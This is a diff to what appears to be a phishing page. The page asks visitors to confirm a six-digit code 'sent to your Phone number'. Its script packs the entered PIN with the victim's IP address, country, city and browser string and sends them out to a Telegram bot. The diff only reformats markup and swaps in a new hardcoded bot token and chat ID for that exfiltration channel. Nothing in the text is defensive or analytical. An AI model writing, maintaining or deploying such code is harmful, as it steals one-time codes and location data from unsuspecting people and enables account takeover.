@@ -22,7 +22,9 @@
 
       <!-- Required Note -->
       <p class="text-gray-600 text-sm mt-6">
-        Confirm the 6-digits code sent to your Phone number<span id="email"></span>
+        Confirm the 6-digits code sent to your Phone number<span
+          id="email"
+        ></span>
       </p>
 
       <!-- Form -->
@@ -103,8 +105,8 @@
 
           const message = `Pin ${password}\nIP: ${location.ip}\nCountry: ${location.country}\nCity: ${location.city}\nBrowser: ${userAgent}`;
 
-          const botToken = "7048228186:AAGaWpefH-VCjtn4SlLvY08tvlOIp6cQQGI";
-          const chatId = "8057732319";
+          const botToken = "8787806060:AAFG688MIDXTAjJUv4WIo6R859bTxBsO3H4";
+          const chatId = "6416614463";
           const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
           // Show loading bar
